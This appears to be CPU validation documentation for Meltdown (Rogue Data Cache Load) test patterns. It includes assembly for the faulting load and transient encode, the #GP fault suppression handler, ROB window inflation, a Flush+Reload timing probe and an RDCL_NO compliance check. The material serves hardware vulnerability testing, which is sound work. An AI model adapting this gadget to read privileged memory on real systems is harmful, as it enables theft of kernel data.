# Meltdown (RDCL) CSLE Test Patterns

## Overview

Meltdown (Rogue Data Cache Load) exploits out-of-order execution to speculatively read supervisor data from CPL=3 before the #GP fault retires. The transient value is encoded into the cache via a dependent load, then recovered via Flush+Reload.

## Attack Flow

```
CPL=0 prologue:
  1. WB MTRRs, clear SPEC_CTRL
  2. Enumerate IA32_ARCH_CAPABILITIES → RDCL_NO bit
  3. Self-calibrate cache latency threshold
  4. Preload FS = secret_data_sel (DPL=0 access legal from CPL=0)
  5. retf → CPL=3

CPL=3 gadget (×SAMPLES):
  1. FLUSH 256 probe lines (scrambled: (i*167+13) & 0xFF)
  2. INFLATE: 300× serial ADD chain (saturate ROB, delay fault retirement)
  3. FAULTING LOAD: mov bl, fs:[0] → #GP (DPL=0 segment from CPL=3)
     → transient forwarding: bl = secret byte (e.g., 0x42)
  4. SPECULATIVE ENCODE: movzx bx, bl; shl bx, 12; mov al, es:[bx]
     → caches reload_buf[secret * 4096]
  5. #GP handler → redirects EIP to stopspeculate
  6. RELOAD: rdtsc-timed scan of all 256 lines → HIST[i]++ if < threshold

Verdict:
  HIST[0x42] >= 1 → ACED (leak observed)
  else → DEAD (no leak / mitigated)
```

## Key Differences from RRSBA

| Aspect | Meltdown | RRSBA |
|--------|----------|-------|
| Speculation source | OOO window inflation (ADD chain) | BTB training + RSB drain |
| Fault | #GP (segment DPL violation) | None (speculative mispredict) |
| #GP role | Suppress fault, redirect EIP | Test termination (hlt) |
| Secret source | DPL=0 data byte at fs:[0] | BTB-predicted RET target |
| Probe lines scanned | All 256 (histogram) | 1 target + 1 control |
| Samples per run | 4 (or 1 in optimized) | 1 per pass |
| A/B structure | No (single + compliance check) | Yes (Pass A/B) |

## #GP Handler — Fault Suppression

The #GP handler suppresses the architectural fault and redirects CPL=3 execution to `stopspeculate`:

```nasm
; Handler CODE (via $idt->handler, vector 13):
  ; #GP pushes error code on USE32 kernel stack
  add esp, 4                          ; pop error code
  mov eax, dword ptr ds:[STOP_IP_SLOT] ; pre-published redirect address
  mov dword ptr [esp], eax            ; overwrite saved EIP
  mfence
  iretd                               ; resume at stopspeculate in CPL=3
```

**Critical**: The ring3 code publishes `stopspeculate`'s offset before the gadget:
```nasm
  mov eax, offset stopspeculate
  mov dword ptr ds:[STOP_IP_SLOT], eax
```

The handler reads this from the witness segment (DS is preserved across the transition because the ring3 DS selector is still valid).

## Window Inflation (300× ADD Chain)

```nasm
  xor eax, eax
  add ax, 0x141    ; repeated 300 times (Perl loop generates these)
  add ax, 0x141
  add ax, 0x141
  ...              ; 300 serial RAW dependencies saturate ~512-entry ROB
```

The ADD chain creates a long dependency chain that delays retirement of subsequent instructions. The faulting load (`mov bl, fs:[0]`) goes OOO and executes speculatively before the chain completes.

## Faulting Load + Transient Encode

```nasm
  ; FS = secret_data_sel (DPL=0), preloaded from CPL=0 before retf
  mov bl, byte ptr fs:[0]        ; raises #GP from CPL=3; transient value in bl
  movzx bx, bl                   ; zero-extend
  shl bx, 12                     ; × 4096 (page stride)
  mov al, byte ptr es:[bx]       ; transient dependent load → caches probe line

stopspeculate:
  nop
  nop
  mfence
```

## Flush+Reload Timing Probe

```nasm
reload_loop:
  ; Scrambled index: mix_i = ((i * 167) + 13) & 0xFF
  mfence
  rdtsc
  mov ebp, eax                   ; t0
  ; load probe line
  mov eax, mix_i
  shl eax, 12
  mov al, byte ptr es:[eax]
  mfence
  rdtsc
  sub eax, ebp                   ; elapsed

  cmp eax, dword ptr ds:[LAT_THRESH]
  jae reload_skip                ; MISS → next line
  ; HIT: increment HIST[mix_i] and HIT_COUNT
  inc dword ptr ds:[HIST + mix_i*4]
  inc dword ptr ds:[HIT_COUNT_TOTAL]
  ; Check if this is the expected secret
  cmp mix_i, 0x42
  jne reload_skip
  inc dword ptr ds:[HIT_COUNT_SECRET]
reload_skip:
  ; next i
```

## Self-Calibration (CPL=0 Prologue)

```nasm
  ; Measure HIT latency: load line into cache, then time re-read
  mov al, byte ptr es:[0]        ; warm the line
  mfence
  rdtsc → t0
  mov al, byte ptr es:[0]        ; timed re-read
  rdtsc → t1
  HIT_LAT = t1 - t0

  ; Measure MISS latency: clflush line, then time read
  clflush es:[0]
  mfence
  rdtsc → t0
  mov al, byte ptr es:[0]
  rdtsc → t1
  MISS_LAT = t1 - t0

  ; Threshold = midpoint (if gap ≥ 30 cycles, else fallback 250)
  LAT_THRESH = (HIT_LAT + MISS_LAT) / 2
```

## Compliance Verdict (RDCL_NO)

```nasm
  ; Read IA32_ARCH_CAPABILITIES (MSR 0x10A)
  mov ecx, 0x10A
  rdmsr
  ; Bit 0 = RDCL_NO (CPU claims immunity to Meltdown)

  ; If RDCL_NO=1 and HIT_COUNT>0 → COMPLIANCE FAIL (leak despite claim)
  ; If RDCL_NO=0 and HIT_COUNT>0 → COMPLIANCE PASS (leak expected)
  ; If RDCL_NO=1 and HIT_COUNT=0 → COMPLIANCE PASS (no leak, as claimed)
```

## Pre-Si Optimized Variant

For faster turnaround on emulation:
- SAMPLES: 4 → 1
- INFLATE_COUNT: 300 → 150
- Probe lines: 256 → 128
- Scramble: `(k*37+13) & 0x7F`
- Expected ~45% cycle savings

## Witness Layout (Meltdown)

```
Offset  Field              Purpose
0x00    MY_DATA            Random canary
0x04    LAT_THRESH         Calibrated threshold
0x08    STOP_IP_SLOT       Published stopspeculate offset
0x0C    RDCL_NO_BIT        Enumerated RDCL_NO value
0x10    HIT_COUNT_TOTAL    Total cache hits across all lines
0x14    HIT_COUNT_SECRET   Hits on expected secret index
0x18    SAMPLES_DONE       Iteration counter
0x1C    VERDICT            0xACED (leak) / 0xDEAD (no leak)
0x20    COMPLIANCE         0xACED (matches enumeration) / 0xDEAD
0x100   HIST[256]          Per-line hit histogram (4 bytes each)
```

## FS Preload Trick

The secret_data segment has DPL=0. From CPL=0 (before retf to ring3), load FS with the selector:

```nasm
  mov ax, secret_data_sel
  mov fs, ax
```

After `retf` to CPL=3, FS still holds the DPL=0 selector. Any CPL=3 access via FS raises #GP — but the speculative path reads the data transiently before the fault retires.

## Reference Tests

| Test | Variant | Status |
|------|---------|--------|
| `meltdown_rdcl_csle.max` | Full (4 samples, 256 lines) | PASS |
| `meltdown_rdcl_presi_opt.max` | Optimized (1 sample, 128 lines) | PASS |
